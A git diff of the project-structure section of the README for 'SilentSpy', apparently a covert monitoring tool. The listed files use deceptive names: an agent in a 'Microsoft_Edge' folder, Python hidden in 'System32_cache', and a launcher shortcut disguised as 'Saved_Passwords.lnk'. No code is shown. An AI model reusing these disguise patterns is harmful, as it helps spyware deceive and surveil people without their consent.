@@ -137,14 +137,23 @@ Shell Commands Examples
 ## 📁 Project Structure
 
 SilentSpy/
+
 ├── Microsoft_Edge/
-│   └── agent.py           # Main monitoring agent
+
+  └── agent.py           # Main monitoring agent
+
 ├── System32_cache/        # Portable Python (large files via LFS)
+
 ├── Windows/               # Dashboard files
+
 ├── Photos.vbs             # VBS launcher
+
 ├── Saved_Passwords.lnk    # Disguised shortcut of Photos.vbs
+
 ├── Photos.vbs             # Batch launcher
+
 ├── .gitattributes         # Git LFS configuration
+
 └── README.md              # This file
 
 ---
